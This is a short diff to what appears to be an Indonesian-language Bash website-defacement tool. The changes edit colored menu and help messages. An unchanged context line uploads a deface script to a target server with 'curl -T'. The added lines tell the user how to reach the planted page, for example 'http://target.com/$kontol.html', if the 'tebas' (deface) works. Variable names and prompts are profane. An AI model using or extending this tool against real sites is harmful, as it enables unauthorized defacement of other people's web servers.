@@ -122,6 +122,10 @@ curl -T /storage/emulated/0/$script $target
 echo $cyan"     ["$green"+"$cyan"]"$red"==="$white"＞"$green"$target"
 echo
 echo
+echo $red"Kalo berhasil ke tebas akses url sperti biasa"
+echo $green"Tapi kalo tidak berhasil ke tebas pakai nama SC di belakangnya"
+echo $yellow"Contoh: http://target.com/$kontol.html"
+echo
 echo $indigo"["$red"B"$indigo"]"$white"back "$indigo"["$red"Q"$indigo"]"$white"Quit"
 read -p "[B/Q] " bangsat
 fi
@@ -228,7 +232,7 @@ echo $cyan"     ["$green"+"$cyan"]"$red"==="$white"＞"$green"$target10"
 echo
 echo $red"Kalo berhasil ke tebas akses url sperti biasa"
 echo $green"Tapi kalo tidak berhasil ke tebas pakai nama SC di belakangnya"
-echo $yellow"Contoh: http://target.com/Chemod777.html"
+echo $yellow"Contoh: http://target.com/$kontol.html"
 echo
 echo $indigo"["$red"B"$indigo"]"$white"back "$indigo"["$red"Q"$indigo"]"$white"Quit"
 read -p "[B/Q] " bangsat
